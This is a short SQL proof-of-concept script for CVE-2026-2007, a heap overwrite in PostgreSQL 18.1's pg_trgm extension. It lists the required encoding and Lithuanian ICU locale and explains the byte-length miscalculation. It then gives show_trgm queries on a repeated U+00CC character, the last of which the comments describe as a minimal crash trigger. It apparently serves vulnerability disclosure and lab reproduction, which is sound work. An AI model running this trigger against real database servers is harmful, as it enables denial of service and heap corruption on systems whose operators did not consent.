-- CVE-2026-2007 pg_trgm heap overwrite/crash trigger.
--
-- Required database properties:
--   ENCODING LATIN9
--   LOCALE_PROVIDER icu
--   ICU_LOCALE 'lt'
--   LC_CTYPE 'lt_LT.ISO-8859-15'
--
-- The U+00CC character lower-cases to three LATIN9 bytes under Lithuanian ICU:
--   0xcc -> 0x69 0x1a 0x1a
--
-- PostgreSQL 18.1 pg_trgm sizes the trigram output array from the original
-- byte length. Repeating this character four times corrupts the allocation
-- metadata and aborts the backend in an assert/debug build.

CREATE EXTENSION IF NOT EXISTS pg_trgm;

SELECT lower(U&'\00CC') AS lowered,
       length(lower(U&'\00CC')) AS lowered_chars,
       octet_length(lower(U&'\00CC')) AS lowered_bytes,
       encode(lower(U&'\00CC')::bytea, 'hex') AS lowered_hex;

-- These already emit memory-context overwrite warnings in a debug build.
SELECT 1 AS n, cardinality(show_trgm(repeat(U&'\00CC', 1))) AS trigrams;
SELECT 2 AS n, cardinality(show_trgm(repeat(U&'\00CC', 2))) AS trigrams;
SELECT 3 AS n, cardinality(show_trgm(repeat(U&'\00CC', 3))) AS trigrams;

-- Minimal crash trigger observed in this lab.
SELECT 4 AS n, cardinality(show_trgm(repeat(U&'\00CC', 4))) AS trigrams;
